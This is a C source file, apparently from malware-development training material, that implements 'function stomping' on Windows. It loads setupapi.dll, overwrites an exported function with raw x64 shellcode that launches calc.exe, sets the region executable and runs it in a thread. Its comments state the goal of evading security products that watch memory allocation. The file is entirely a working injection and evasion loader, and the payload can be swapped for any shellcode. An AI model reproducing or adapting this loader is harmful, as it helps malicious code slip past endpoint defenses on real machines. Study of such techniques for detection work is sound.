#include <stdio.h>
#include <Windows.h>

/*
* The process of allocating private memory is highly monitored by security solutions due to its widespread usage by malware.
* Function stomping is a technique where an original function's bytes are replaced with new code.
* This technique avoids the usage of highly-monitored WinAPIs.
*/

/*
* Overwriting a commonly-used function can result in uncontrolled execution or crashes.
* Less commonly-used functions should be used for this, like MessageBox.
* In this example, we'll stomp SetupScanFileQueueA from `Setupapi.dll`.
* https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupscanfilequeuea
*/

#define		SACRIFICIAL_DLL		"setupapi.dll"
#define		SACRIFICIAL_FUNC	"SetupScanFileQueue"

// x64 exec calc
unsigned char Payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RW] failed with error: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] failed with error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;

}

int main() {

	PVOID	pAddress	= NULL;
	HMODULE	hModule		= NULL;
	HANDLE	hThread		= NULL;

	printf("[#] Press <Enter> to load \"%s\"...", SACRIFICIAL_DLL);
	getchar();

	// Load Setupapi.dll into the local process memory using LoadLibraryA
	printf("[i] Loading...\n");
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!] LoadLibraryA failed with error: %d\n", GetLastError());
		return -1;
	}
	printf("[+] DONE!\n");

	// Retrieve the function's address using GetProcAddress
	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		return -1;
	}

	printf("[+] Address of \"%s\": 0x%p\n", SACRIFICIAL_FUNC, pAddress);

	printf("Press <Enter> to write payload...");
	getchar();

	// Stomp the function:
	// 1) Mark its memory region as readable and writable using VirtualProtect.
	// 2) Write the payload into the function's address.
	// 3) Use VirtualProtect to mark the region as RWX.
	printf("[i] Writing...\n");
	if (!WritePayload(pAddress, Payload, sizeof(Payload)))
		return -1;
	printf("[+] DONE\n");

	printf("[#] Press <Enter> to run the payload...");
	getchar();

	// Spawn payload
	hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> to quit...");
	getchar();

	return 0;

}